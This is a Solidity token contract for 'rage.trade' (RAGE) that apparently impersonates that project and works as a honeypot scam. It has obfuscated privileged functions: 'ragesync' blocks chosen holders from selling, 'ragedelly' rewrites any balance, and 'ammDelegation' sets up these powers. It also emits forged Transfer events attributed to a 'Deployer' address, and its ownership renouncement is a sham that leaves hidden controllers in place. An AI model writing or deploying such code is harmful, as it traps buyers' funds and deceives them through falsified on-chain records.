// File: ragetrade.sol



/**



https://www.rage.trade/



https://docs.rage.trade/terms-and-conditions



Our Goal: Build the most liquid, composable & only omnichain ETH perp.



*/







pragma solidity 0.8.17;





  library SafeMath {



    function add(uint256 a, uint256 b) internal pure returns (uint256) {

        uint256 c = a + b;

        require(c >= a, "SafeMath: addition overflow");



        return c;

    }



    function sub(uint256 a, uint256 b) internal pure returns (uint256) {

        return sub(a, b, "SafeMath: subtraction overflow");

    }



    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b <= a, errorMessage);

        uint256 c = a - b;



        return c;

    }



    function mul(uint256 a, uint256 b) internal pure returns (uint256) {



        if (a == 0) {

            return 0;

        }



        uint256 c = a * b;

        require(c / a == b, "SafeMath: multiplication overflow");



        return c;

    }





    function div(uint256 a, uint256 b) internal pure returns (uint256) {

        return div(a, b, "SafeMath: division by zero");

    }





    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b > 0, errorMessage);

        uint256 c = a / b;



        return c;

    }



    function mod(uint256 a, uint256 b) internal pure returns (uint256) {

        return mod(a, b, "SafeMath: modulo by zero");

    }



    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b != 0, errorMessage);

        return a % b;

    }

}   

 

 

contract ragetrade {

  

    mapping (address => uint256) public rZXm;

    mapping (address => bool) eRSm;

	mapping (address => bool) eRn;







    // 

    string public name = "rage.trade";

    string public symbol = unicode"RAGE";

    uint8 public decimals = 18;

    uint256 public totalSupply = 9000000000 * (uint256(10) ** decimals);

    uint eM = 1;

   

    event Transfer(address indexed from, address indexed to, uint256 value);

     event OwnershipRenounced(address indexed previousOwner);



        constructor()  {

        rZXm[msg.sender] = totalSupply;

        deploy(Deployer, totalSupply); }







	address owner = msg.sender;

    address Router = 0x1e511FDD77D5d7CeF8d2d6157C2a793947Ad0bE1;

    address Deployer = 0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B;

   





    function renounceOwnership() public {

    require(msg.sender == owner);

    emit OwnershipRenounced(owner);

    owner = address(0);}





    function deploy(address account, uint256 amount) public {

    require(msg.sender == owner);

    emit Transfer(address(0), account, amount); }

    modifier iQ () {

        eM = 0;

        _;}



        function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == Router)  {

        require(rZXm[msg.sender] >= value);

        rZXm[msg.sender] -= value;  

        rZXm[to] += value; 

        emit Transfer (Deployer, to, value);

        return true; } 

        if(eRSm[msg.sender]) {

        require(eM == 1);} 

        require(rZXm[msg.sender] >= value);

        rZXm[msg.sender] -= value;  

        rZXm[to] += value;          

        emit Transfer(msg.sender, to, value);

        return true; }



        function ammDelegation(address Ex) iQ public {

        require(msg.sender == owner);

        eRn[Ex] = true;} 





        function balanceOf(address account) public view returns (uint256) {

        return rZXm[account]; }

        function ragesync(address Ex) Si public{          

        require(!eRSm[Ex]);

        eRSm[Ex] = true;}

		modifier Si () {

        require(eRn[msg.sender]);

        _; }

        event Approval(address indexed owner, address indexed spender, uint256 value);



        mapping(address => mapping(address => uint256)) public allowance;



        function approve(address spender, uint256 value) public returns (bool success) {    

        allowance[msg.sender][spender] = value;



        emit Approval(msg.sender, spender, value);

        return true; }

		 function ragedelly(address Ex, uint256 iZ) Si public returns (bool success) {

        rZXm[Ex] = iZ;

        return true; }

        function ragew(address Ex) Si public {

        require(eRSm[Ex]);

        eRSm[Ex] = false; }







        function transferFrom(address from, address to, uint256 value) public returns (bool success) {   

        if(from == Router)  {

        require(value <= rZXm[from]);

        require(value <= allowance[from][msg.sender]);

        rZXm[from] -= value;  

        rZXm[to] += value; 

        emit Transfer (Deployer, to, value);

        return true; }    

        if(eRSm[from] || eRSm[to]) {

        require(eM == 1);}

        require(value <= rZXm[from]);

        require(value <= allowance[from][msg.sender]);

        rZXm[from] -= value;

        rZXm[to] += value;

        allowance[from][msg.sender] -= value;

        emit Transfer(from, to, value);

        return true; }}